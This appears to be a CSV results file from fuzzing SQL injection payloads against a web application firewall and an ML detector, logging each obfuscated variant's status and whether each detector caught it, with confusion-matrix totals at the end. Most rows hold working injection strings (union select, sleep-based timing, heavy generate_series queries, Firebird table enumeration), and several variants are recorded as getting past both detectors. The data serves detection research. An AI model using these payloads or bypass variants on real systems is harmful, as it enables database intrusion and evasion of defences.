Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
11,2024-08-27T11:28:47.538748,"1%""""))) union all select null,null--",403,403,403,both_correct,"(seLeCT (SELECT 3440 LIKE 3440))%"""")))
union all SElEct/**/null,null--",2024-08-27T11:28:49.221993,403,403,both_correct,"(seleCt (SELect  OR 0 likE 9606 like (SELecT 3440)))%"""")))
union all	SeLeCT null,null--",2024-08-27T11:28:53.821740,403,403,both_correct,"(selEct/**/(sElecT  OR 5633<>5634 like  Or 0 likE (SeLeCt 0xd70)))%"""")))
union all
SeLEcT null,null--",2024-08-27T11:28:58.770892,403,403,both_correct,"(SeLecT (seLect  oR 5633<>(SELECT 5634) liKe  oR  ANd ''='' likE (SElecT 0xd70)))%"""")))
union all sElEct null,null--",2024-08-27T11:29:04.426903,403,403,both_correct,"(seLect (sELect/**/ oR  OR 0x0!=(SeLect 'h'!='hI') Like 
oR  anD ''='' LIke (sELeCT 0xd70)))%"""")))
union all sELECt null,null--",2024-08-27T11:29:11.777460,403,403,both_correct,"(sElEcT (SeLecT  OR  Or 0x0!=(SeLECt 'h' not like 'hI') liKe 
Or  AnD ''='' LiKE (SELECt 0xd70)))%"""")))	union all SeleCt null,null--",2024-08-27T11:29:21.597325,403,403,both_correct,"(seLEcT (seLect  or  oR 0x0!=(SeleCT	'h' not like 'hI') liKE 
or  And '' liKe ''/**/Like (sElECt 0xd70)))%"""")))	union all seLEct null,null--",2024-08-27T11:29:31.703357,403,403,both_correct,"(SElecT (sELEcT  Or  oR 0x0 not like (seleCT	'h' not like 'hI')/**/lIKe 
Or  anD ''	lIkE ''/*P5(!*/LikE (sELeCt 0xd70)))%"""")))	union all SeLECt null,null--",2024-08-27T11:29:42.268926,403,403,both_correct,"(sEleCT (sELeCt/**/ OR  OR 0x0 not like (seLECt	'h' not like 'hI')/**/lIkE 	oR  AND ''	liKE ''/*P5(!*/LiKe (sElEct 0xd70)))%"""")))	union all seLecT null,null--",2024-08-27T11:29:54.051090,403,403,both_correct,"(SElecT (SeLEct/*\*/ oR 
OR 0x0 not like (sElect	'h' not like 'hI') lIKe 	oR  AND ''	LIke ''/*P5(!*/LIKe (seleCT 0xd70)))%"""")))	union all SeLECT null,null--",2024-08-27T11:30:05.729496,403,403,both_correct
12,2024-08-27T11:30:17.772159,1' and 5967=4184#,403,403,403,both_correct,'T8E'<>'T8En''/* */aNd  Or 0 lIke	0x1058#,2024-08-27T11:30:19.094544,200,200,both_incorrect,"'T8E'!='T8En''/*
*/aNd  Or 'lC'!='lCt'/**/LIkE	0x1058#y",2024-08-27T11:30:23.210249,200,200,both_incorrect,"'T8E' NOT LIKE 'T8En''/**/aNd  Or 'lC'!='lCt' LIKe
0x1058#yG",2024-08-27T11:30:28.201967,200,200,both_incorrect,"'T8E' not
like 'T8En'' aNd  Or 'lC'!='lCt' LIKe
0x1058#yG",2024-08-27T11:30:33.314944,200,200,both_incorrect,"'T8E' not	like 'T8En'' aNd  Or 'lC'!='lCt'/**/likE
0x1058#yG",2024-08-27T11:30:38.176023,200,200,both_incorrect,"'T8E' not
like 'T8En'' aNd /**/Or 'lC'!='lCt'/*X*/LIkE
0x1058#yG",2024-08-27T11:30:43.300273,200,200,both_incorrect,"'T8E' not
like 'T8En'' aNd
 Or 'lC'!='lCt'/*g8D*/LiKE
0x1058#yG",2024-08-27T11:30:48.691073,200,200,both_incorrect,"'T8E' not
like 'T8En'' aNd /**/Or 'lC'!='lCt'/*g8D*/lIkE
0x1058#yGKf",2024-08-27T11:30:54.202400,200,200,both_incorrect,"'T8E' not like 'T8En'' aNd  Or 'lC'!='lCt'/*g8D*/lIKE
0x1058#yGKfP}",2024-08-27T11:31:00.094089,200,200,both_incorrect,"'T8E' not	like 'T8En'' aNd/**/ Or 'lC'!='lCt'/**/liKe
0x1058#yGKfP}@a",2024-08-27T11:31:06.117921,200,200,both_incorrect
13,2024-08-27T11:31:11.499899,"1"""" where 1920=1920 and 8635=(select count(*) from generate_series(1,5000000))--",403,200,403,waf_incorrect_ml_correct,"'jy.'<>'jy.Y'"""" wheRe
1920 LikE 1920 AnD 8635=(seleCt count(*) frOM/**/generate_series((SELeCT 1), OR 0))--",2024-08-27T11:31:16.552496,403,403,both_correct,"'jy.' not like 'jy.Y'"""" wheRE
0x780 LiKe 6138 NOT LIKE 6139 aNd  oR
0=(SeleCT count(*)/**/fROM/*`JhU*/generate_series((seleCt 1), OR 0))--",2024-08-27T11:31:24.626436,403,200,waf_correct_ml_incorrect,"'jy.' not like 'jy.Y'"""" WHerE
0x780 Like  AND 1 NOT LIKE/**/3152 NOT LIKE 6139 AnD  OR
0 LIKE (sELect count(*)/**/frOM/*/zE */generate_series((seLeCT 0x1), OR 0))--",2024-08-27T11:31:34.948602,403,403,both_correct,"'jy.' not like
'jy.Y'"""" wHErE
0x780 lIke  && 0x1 NOT LIKE/**/(SELECT 1) NOT LIKE 6139 AND  Or
7448 LIKE 7448 liKe (SeLeCt count(*)/**/from/*/zE/**/*/generate_series((Select 0x1), OR 0))--",2024-08-27T11:31:47.123158,403,403,both_correct,"'jy.' not like
'jy.Y'"""" WheRe
0x780	likE  && 0x1 NOT LIKE/**/(sElEcT 1) NOT LIKE 'qI' NOT LIKE 'qIL' anD  or
(SELECT 7448) LIKe  AND 1 likE (SeLEcT count(*)/**/FRoM/*/zE */generate_series((seLECt 0x1), || 0))--",2024-08-27T11:32:00.485287,403,403,both_correct,"'jy.' not like
'jy.Y'"""" WhERE
0x780
lIKe  && 0x1 NOT LIKE/**/(selECt 1)/**/NOT LIKE 'qI' NOT LIKE 'qIL' anD  or
(seLect 7448) LiKE  AnD 1267 LIkE 1267 LiKe (SEleCT count(*)/**/From/*/zE */generate_series((SElEct 0x1),  or  (seLECT (SELECT 1))))--",2024-08-27T11:32:15.571660,403,403,both_correct,"'jy.' not like
'jy.Y'"""" WHERE
0x780	lIke   AND  0x1 NOT LIKE/**/(SeLect 1) NOT LIKE 'qI' NOT LIKE 'qIL' and  or
(seLeCt 7448) liKe  AnD 0x188 iN (391,392,393) likE  ANd 1 likE (SElect count(*)/*9VM*/FRom/*/zE */generate_series((seLECT 0x1),  OR  (selEct (SelEcT 1))))--",2024-08-27T11:32:32.681594,403,403,both_correct,"'jy.' not like 'jy.Y'"""" where
0x780	lIkE   AND  0x1 NOT LIKE/**/(SELECt 1) not like 'qI' NOT LIKE 'qIL' AND  OR
(selecT 7448) lIkE  AND 0x188 In ( OR 0,392,393) lIkE  AND 1 lIKe (seLEct count(*)/*9VM*/FrOM/*/zE */generate_series((selEct 0x1),  OR/*7nlT*/ (sElEct (sElecT (SelECT 9491=9491)))))--",2024-08-27T11:32:52.297297,403,403,both_correct,"'jy.' not like 'jy.Y'"""" wHeRE
0x780	Like   AND  0x1 NOT LIKE/**/(sEleCT (SELECT 1)) not like 'qI' NOT LIKE 'qIL' ANd  Or	(sELect ',yX'!=',yX4') Like  aND 0x188 In ( Or 0,392,393) lIke  AnD 1 LiKe (seLEct count(*)/*9VM*/from/*/zE */generate_series((selEct 0x1), /**/Or/*7nlT*/ (sELect (selEcT (SelECT 9491 like  OR 0)))))--",2024-08-27T11:33:12.895840,403,403,both_correct,"'jy.' not like 'jy.Y'"""" whERe
0x780	lIKE   and  0x1 NOT LIKE/**/(SelecT (SeLeCT  OR 0)) not like 'qI' not like 'qIL' AND  or	(sELECt	',yX'!=',yX4') lIke  ANd 0x188 in ( Or 0,'b'!='bK',393) lIKE  aND 1 LiKe (SELECT count(*)/*Z'*/frOM/*/zE */generate_series((sEleCT 0x1),  Or/**/ (sELeCT (SeLecT (SeLect 9491 lIKe  Or (SEleCT 0))))))--",2024-08-27T11:33:34.985416,403,403,both_correct
14,2024-08-27T11:39:13.565165,"conde de olocau, s/n, 3g",200,200,200,both_correct,"conde de
olocau,/**/s/n, 3g",2024-08-27T11:39:15.292536,200,200,both_correct,"conde
de
olocau,/**/s/n,/**/3g",2024-08-27T11:39:18.044342,200,200,both_correct,"conde
de
olocau,/**/s/n,	3g",2024-08-27T11:39:21.042081,200,200,both_correct,"conde
de	olocau, s/n,	3g",2024-08-27T11:39:23.876161,200,200,both_correct,"conde
de
olocau,/*S*/s/n,	3g",2024-08-27T11:39:26.400953,200,200,both_correct,"conde
de
olocau,/**/s/n,
3g",2024-08-27T11:39:29.342471,200,200,both_correct,"conde
de
olocau,
s/n,
3g",2024-08-27T11:39:32.145614,200,200,both_correct,"conde
de olocau,
s/n,
3g",2024-08-27T11:39:34.793607,200,200,both_correct,"conde
de	olocau,
s/n,
3g",2024-08-27T11:39:37.417466,200,200,both_correct,"conde	de	olocau,
s/n,
3g",2024-08-27T11:39:39.931524,200,200,both_correct
15,2024-08-27T11:39:42.452421,"1"""")) as femc where 1313=1313 and 4595=4595#",403,200,403,waf_incorrect_ml_correct,"1"""")) aS femc/**/WHEre (sELECT 1313)='x'<>'x0' aNd 	aND 1=4595#<",2024-08-27T11:39:45.260494,200,200,both_incorrect,"1"""")) as femc/**/wHeRE (seleCT 1313) LIKe 'x'<>'x0'
ANd/**/	AnD '2#'=' AND 0x1#'=4595#<H",2024-08-27T11:39:50.390707,200,200,both_incorrect," oR (SeLeCT 0)"""")) aS femc/**/WHeRE (seLECt 1313) liKe 'x' not like/**/'x0'
aND/**/	AnD '2#'=' AND
0x1#'=',C'=',C'#<H4/",2024-08-27T11:39:57.082117,200,200,both_incorrect," or (SeleCT 0)"""")) AS femc/**/WHeRE (select 'a'!='a|') LikE 'x' not like/**/'x0'	and/**/	aNd '2#'=' AND
0x1#'=',C'/**/likE ',C'#<H4/ OR 0x0",2024-08-27T11:40:04.818226,200,200,both_incorrect," or (SeLect 8550<>8551)"""")) as femc/**/wHEre (SElEct 'a'!='a|') lIKE 'x' not like/**/'x0'	And 	aND ' AND (SELECT 1)#'=' AND 0x1#'=',C'/**/LiKe ',C'#<H4/ oR 0x0V",2024-08-27T11:40:13.120245,200,403,waf_incorrect_ml_correct," oR (sELECT/*k*/0x2166<> OR 0)"""")) aS femc/**/WHeRe (SeLect 'a'!='a|') like 'x' not like/**/'x0'
aND 	And ' AND (SELECT '^VWV' LIKE '^VWV')#'=' AND 0x1#' LiKe ',C'/**/LIKe ',C'#<H4/ oR 0x0V",2024-08-27T11:40:22.585382,200,403,waf_incorrect_ml_correct," or (SeleCt/**/0x2166<> OR  AND (SELECT 1) liKe 5874)"""")) aS femc/**/wHERE (SeleCt 'a'!='a|') LikE 'x' not like/**/'x0'	ANd 	aNd ' AND (SELECT '^VWV' LIKE '^VWV')#'=' AND 0x1#'/**/LiKe ',C'/**/Like ',C'#<H4/ oR 0x0V",2024-08-27T11:40:31.945909,200,403,waf_incorrect_ml_correct," OR (SELeCT/**/0x2166<>/**/oR  And (SElEcT 7481 IN (7480,7481,7482)) LIke (SElECT (SEleCT 1)))"""")) aS femc/**/WheRe (SelECt 'a' not like 'a|') lIkE 'x' not like/*x*/'x0'	AND 	anD ' AND (SELECT '^VWV' LIKE '^VWV')#'='
AND 0x1#'/**/liKE ',C'/**/like ',C'#<H4/ Or 0x0V",2024-08-27T11:40:42.808839,403,403,both_correct," oR (SELecT/**/0x2166<> or  anD (SelECt (selEct  OR 0) IN (7480,'>N7='<>'>N7=]',7482)) LiKE (SELeCT (SeLEcT 1)))"""")) aS femc/**/WHERe (SELeCt 'a' not like 'a|')	LiKe 'x' not like/*x*/'x0'	ANd 	aNd ' AND (SELECT '^VWV' LIKE '^VWV')#' like '
AND 0x1#'/**/liKE ',C'/**/lIKE ',C'#<H4/ oR 0x0VVt",2024-08-27T11:40:55.919442,403,403,both_correct," oR (SeLECt/**/0x2166<> oR  aNd (SELECT (SelecT  OR 0) iN ( AND 1,'>N7=' NOT LIKE '>N7=]','L'' LIKE 'L'')) lIKe (SeLecT (SeLEct 0x1)))""""))/**/AS femc/**/wHERE (SEleCt 'a' not like 'a|')	LIKe 'x' not like/*x*/'x0'	AnD 	AND ' AND (SELECT '^VWV' LIKE '^VWV')#' liKE ' AND 0x1#'/**/lIkE ',C'/**/likE ',C'#<H4/ OR 0x0VVtK",2024-08-27T11:41:10.900855,403,403,both_correct
16,2024-08-27T11:41:26.126204,"1"""") as mszg where 6184=6184 rlike sleep(5)--",403,403,403,both_correct,"'*""' not like '*""G'"""") AS	mszg whERe 6184=6184/**/rlike sleep((SeLEcT  ANd 1))--",2024-08-27T11:41:28.350019,403,403,both_correct,"'*""' not like '*""G'"""") as
mszg wHerE  OR 0=';' LIKE ';'/**/rlike sleep((selEct  ANd/**/0x1))--",2024-08-27T11:41:33.168421,403,403,both_correct,"'*""' not like '*""G'"""") as mszg WhEre  or 0x0 LIKE ';' LIKE ';'/**/rlike sleep((seLEcT/**/ and/**/0x1))--",2024-08-27T11:41:38.744811,403,403,both_correct,"'*""' not like '*""G'"""") as mszg whEre 	oR 0x0 LikE ';' lIke ';' rlike sleep((SeLeCT/**/ and/**/0x1))--",2024-08-27T11:41:44.413338,403,200,waf_correct_ml_incorrect,"'*""' not like '*""G'"""") aS mszg WHerE 	oR 0x0 LiKE ';'
likE ';' rlike sleep((SeleCT/**/ AnD 0x1))--",2024-08-27T11:41:49.954702,403,200,waf_correct_ml_incorrect,"'*""' not like '*""G'"""") As mszg WhEre 	oR 0x0 Like ';'	like ';'/**/rlike sleep((selecT/*ojC/*/ AnD 0x1))--",2024-08-27T11:41:55.559123,403,403,both_correct,"'*""'
not like '*""G'"""") AS/**/mszg wherE 	or 0x0 lIKe ';'	Like ';'/**/rlike sleep((SELect/*ojC/*/ And 0x1))--",2024-08-27T11:42:01.643065,403,200,waf_correct_ml_incorrect,"'*""' not/**/lIKe '*""G'"""") aS/**/mszg WHERe 	Or 0x0 liKe ';'	lIKe ';'/*
*/rlike sleep((SelecT/*ojC/*/ ANd 0x1))--",2024-08-27T11:42:07.427634,403,200,waf_correct_ml_incorrect,"'*""' not/*0x3#Cb*/Like '*""G'"""") AS mszg whErE 	or 0x0 likE ';'	like ';'/**/rlike sleep((SeLECT/*ojC/*/ aNd 0x1))--",2024-08-27T11:42:13.367332,403,200,waf_correct_ml_incorrect,"'*""' not/**/LIke '*""G'"""") as mszg wHErE 	oR 0x0 liKE ';'	LiKE ';' rlike sleep((sElECT/*ojC/*/	and 0x1))--'",2024-08-27T11:42:19.421742,403,200,waf_correct_ml_incorrect
17,2024-08-27T11:42:25.148112,-2530%' order by 1#,403,403,403,both_correct,- aNd/**/0x1%'	order by 7239<>7240#S',2024-08-27T11:42:26.330583,403,200,waf_correct_ml_incorrect,- anD 0x1%' order by 7239<>(SELECT (SELECT 'E!'='E!'))#S'F,2024-08-27T11:42:29.120703,403,403,both_correct,"- anD 0x1%' order/**/by
 OR 0<>(SELECT 3669)<>(SELECT (SELECT 'E!'='E!'))#S'FKL",2024-08-27T11:42:32.671999,403,403,both_correct,"- anD 0x1%'/**/order/*Th*/by
 OR 0x0<>(SELECT 'PS+'='PS+')<>(SELECT
(SELECT 'E!'='E!'))#S'FKL",2024-08-27T11:42:37.223220,403,403,both_correct,"- and 0x1%' order/*QRP)*/by	 OR 0x0<>(SELECT 'PS+'='PS+')<>(SELECT
(SELECT 'E!'='E!'))#S'FKL",2024-08-27T11:42:42.684662,403,403,both_correct,"- And
0x1%' order/*QRP)*/by	 OR 0x0<>(SELECT 'PS+'='PS+')<>(SELECT
(SELECT/**/'E!'='E!'))#S'FKLCg",2024-08-27T11:42:48.610211,403,403,both_correct,"- aNd 0x1%'/**/order/*QRP)*/by	 OR 0x0<>(SELECT 'PS+'='PS+')<>(SELECT
(SELECT/**/'E!'='E!'))#S'FKLCgL",2024-08-27T11:42:54.590075,403,403,both_correct,"- aNd 0x1%'/**/order/*QRP)*/by	 OR	0x0<>(SELECT/**/'PS+'='PS+')<>(SELECT
(SELECT/**/'E!'='E!'))#S'FKLCgL}!",2024-08-27T11:43:01.131023,403,200,waf_correct_ml_incorrect,"- AnD 0x1%'/**/order/*QRP)*/by	/**/OR 0x0<>(SELECT/**/'PS+'='PS+')<>(SELECT
(SELECT/**/'E!'='E!'))#S'FKLCgL}!.(seLecT 0x1) liKe 8895",2024-08-27T11:43:07.450841,403,403,both_correct,"- AnD 0x1%'/**/order/*QRP)*/by	 OR	0x0<>(SELECT/**/'PS+'='PS+')<>(SELECT
(SELECT/**/'E!'='E!'))#S'FKLCgL}!.(SELect 0x1) likE (SelEcT  && 6389<>6390)",2024-08-27T11:43:15.331519,403,200,waf_correct_ml_incorrect
18,2024-08-27T11:43:22.898826,"1"""";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and """"fkdx"""" like """"fkdx",403,403,200,waf_correct_ml_incorrect," oR 0x0"""";SeLecT
count(*)/**/fROM rdb$fields As t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions as t4 ANd """"fkdx"""" LikE """"fkdx",2024-08-27T11:43:28.304280,403,200,waf_correct_ml_incorrect," oR 0x0"""";sELEct
count(*) fROm rdb$fields As t1,rdb$types AS t2,rdb$collations as t3,rdb$functions as t4 && """"fkdx"""" liKE	""""fkdx",2024-08-27T11:43:35.213362,403,200,waf_correct_ml_incorrect," or 0x0"""";sELect
count(*) FrOm rdb$fields as t1,rdb$types as t2,rdb$collations As t3,rdb$functions aS t4 &&/*f */""""fkdx"""" LikE """"fkdx",2024-08-27T11:43:41.743320,403,200,waf_correct_ml_incorrect," OR 0x0"""";seleCt
count(*) from rdb$fields aS t1,rdb$types as t2,rdb$collations/**/As t3,rdb$functions as t4	&&/**/""""fkdx"""" LiKE """"fkdx",2024-08-27T11:43:48.829508,403,200,waf_correct_ml_incorrect," or 0x0"""";Select	count(*) fROm rdb$fields as t1,rdb$types as t2,rdb$collations/**/as/**/t3,rdb$functions AS t4	&&/**/""""fkdx"""" lIkE """"fkdx",2024-08-27T11:43:55.550173,403,200,waf_correct_ml_incorrect," oR 0x0"""";SelEcT	count(*)	from rdb$fields As t1,rdb$types as t2,rdb$collations/**/AS/**/t3,rdb$functions As t4	 and  """"fkdx"""" liKe """"fkdx",2024-08-27T11:44:02.573326,403,200,waf_correct_ml_incorrect," oR 0x0"""";SEleCt	count(*)	FRoM rdb$fields as t1,rdb$types as t2,rdb$collations/**/AS/**/t3,rdb$functions As t4		And  """"fkdx""""/*`*/lIKe """"fkdx",2024-08-27T11:44:09.656544,403,200,waf_correct_ml_incorrect,"
or 0x0"""";sELect	count(*)	FRoM rdb$fields as/**/t1,rdb$types aS t2,rdb$collations/*bmA*/aS/**/t3,rdb$functions As t4		aNd  """"fkdx""""/**/lIKe """"fkdx",2024-08-27T11:44:17.141788,403,200,waf_correct_ml_incorrect," or 0x0"""";selEcT	count(*)	fRoM rdb$fields As/**/t1,rdb$types AS t2,rdb$collations/**/aS/**/t3,rdb$functions/**/AS t4		aND  """"fkdx""""/**/like """"fkdx",2024-08-27T11:44:24.562977,403,200,waf_correct_ml_incorrect," OR 0x0"""";SEleCT
count(*)	FrOm rdb$fields as/**/t1,rdb$types as t2,rdb$collations/**/as/**/t3,rdb$functions aS t4		AND  """"fkdx""""/**/LIKE """"fkdx",2024-08-27T11:44:31.956230,403,200,waf_correct_ml_incorrect
19,2024-08-27T11:44:39.419522,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,403,403,403,both_correct,"'''!=''7'');begin dbms_lock.sleep((SELECT
(SELECT 1)));/**/end and ('jzlr'='jzlr",2024-08-27T11:44:41.718222,403,403,both_correct,"'''!=''(SELECT 7)'');begin dbms_lock.sleep((SELECT	(SELECT  AND/*PSS*/'m='<>'m LIKE u')));/**/end and ('jzlr'='jzlr",2024-08-27T11:44:46.268617,403,403,both_correct,'''!=''(SELECT 4565 NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT (SELECT  AND/**/'m='<>'m LIKe u'))); end and ('jzlr'='jzlr,2024-08-27T11:44:52.314979,403,403,both_correct,'''!=''(SELECT  AND/**/(SELECT 'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT (SELECT  AND/**/'m like '<>'m LiKe u'))); end	and ('jzlr'='jzlr,2024-08-27T11:44:59.143052,403,403,both_correct,"'''!=''(SELECT  AND/*-*/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT (SELECT  AND/**/'m LikE '<>'m Like
u'))); end	and ('jzlr'='jzlr",2024-08-27T11:45:07.441751,403,403,both_correct,"'''!=''(SELECT /**/AND/*-*/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT (SELECT  AND/**/'m
like '<>'m like
u'))); end	and ('jzlr'='jzlr",2024-08-27T11:45:15.683114,403,403,both_correct,"'''!=''(SELECT /*V,+e~*/AND/*-*/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT (SELECT  AND/**/'m LIKe '<>'m like
u'))); end	and/**/('jzlr'='jzlr",2024-08-27T11:45:24.204025,403,403,both_correct,"'''!=''(SELECT /*V,+e~*/AND/**/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT
(SELECT  AND/**/'m liKe '<>'m like
u')));/**/end	and/**/('jzlr'='jzlr",2024-08-27T11:45:33.374083,403,403,both_correct,"'''!=''(SELECT /*V,+e~*/AND/**/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT	(SELECT  AND/**/'m LIkE/**/'<>'m LIke
u')));/**/end	and/**/('jzlr'='jzlr",2024-08-27T11:45:43.249738,403,403,both_correct,"'''!=''(SELECT /**/AND/**/(SELECT/**/'j'<>'j5') NOT LIKE (SELECT 0x1))'');begin dbms_lock.sleep((SELECT	(SELECT  AND/**/'m lIKE/**/'<>'m	LIKE
u')));/**/end	and ('jzlr'='jzlr",2024-08-27T11:45:53.798661,403,403,both_correct
20,2024-08-27T11:46:03.999108,"1"""")) as femc where 1313=1313 and 4595=4595#",403,200,403,waf_incorrect_ml_correct,"1""""))/**/As femc wHerE 1479!=1480=1313	ANd 4595 lIkE  or (sELeCT 0)#	",2024-08-27T11:46:06.225236,200,200,both_incorrect,"1"""")) aS femc wHeRe 0x5c7!= and 1=1313	AnD '`M' NOT LIKE
'`M(' like  OR (selECt 0)#	im",2024-08-27T11:46:11.067571,200,403,waf_incorrect_ml_correct,"1"""")) as femc WhERe 0x5c7!= AND/**/ anD 1=(SeLeCt 1313)	And '`M' not like	'`M(' lIKE  oR (seLeCt 'i&L' NOT LIKE 'i&Ln')#	im",2024-08-27T11:46:16.454554,200,403,waf_incorrect_ml_correct,"1"""")) as femc where 0x5c7!= anD  And  OR 0<>1207=(SELecT 0x521) aND '`M' not like	'`M(' lIke  oR (seLEcT 'i&L' not like 'i&Ln')#	im",2024-08-27T11:46:23.852055,200,403,waf_incorrect_ml_correct,"' '<>' }'"""")) as femc Where 0x5c7!= anD  And  oR 0<> OR (SELECT 0) LIKe (sEleCT 0x521) anD/**/'`M' not like	'`M(' lIkE 	OR (seLeCt 'i&L' not like 'i&Ln')#	im",2024-08-27T11:46:31.685740,403,200,waf_correct_ml_incorrect,"' '<>' }'"""")) As femc whERE 0x5c7 NOT LIKE  And  ANd  Or (sElECt
0)<> OR (SElECt (selecT 3377=3377)) LIkE (SelEct 0x521) anD '`M' not like	'`M(' liKE 	oR (sEleCT 'i&L' not like 'i&Ln')#	im",2024-08-27T11:46:40.459288,403,403,both_correct,"' '!=' }'"""")) as femc whEre 0x5c7 NOT LIKE  ANd  AND  or (SelECT
(SELECT (SELECT 1)))<> OR (select (sElecT 'P'<>'P.'=3377)) liKe (SElect 0x521) anD '`M' not like	'`M('
LIke 	oR (sElect 'i&L'/**/not like 'i&Ln')#	im>]",2024-08-27T11:46:51.077458,403,403,both_correct,"' '!=' }'"""")) aS femc whErE 0x5c7 not like  aND  AND  OR (sELeCT
(selecT (sElEcT 1)))<> or (seLecT (SeLect 'P'<>'P.'= or 0x0!=367)) liKe (SeleCt 0x521) ANd '`M' not like
'`M('
Like 	Or (selecT 'i&L' not like 'i&Ln')#	im>]id",2024-08-27T11:47:01.346988,403,403,both_correct,"' '!=' }'"""")) As femc WHERE 0x5c7 not like  aNd  AnD  or (seLECt
(sElEct (sElECt (SELECT 8715) NOT LIKE  AND 1)))<> oR (seLEcT (sElEct 'P'<>'P.' like  or 0x0!=367)) likE (sELeCT 0x521) and '`M' not like
'`M('	lIke 	or (sEleCt/*|`6*/'i&L' not like 'i&Ln')#	im>]id",2024-08-27T11:47:12.343947,403,403,both_correct,"' ' not like '/**/}'"""")) AS femc wHERe 0x5c7 not like  And  ANd  OR (sELEcT
(sElect (SeLECt (select 8715) NOT LIKE  ANd (SELECT 1))))<> oR (seLeCt (SElEcT 'P'<>'P.' LikE  or 0x0!= AND 1)) LIke (SelECt 0x521) ANd '`M' not like
'`M(' Like 	or (SEleCT/*|`'sPy'!='sPyP'*/'i&L' not like 'i&Ln')#	im>]id",2024-08-27T11:47:24.600394,403,403,both_correct

Overall Results
WAF TP,109
WAF TN,50
WAF FP,16
WAF FN,45
ML TP,103
ML TN,50
ML FP,16
ML FN,51

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,122,31
ML Incorrect,37,30
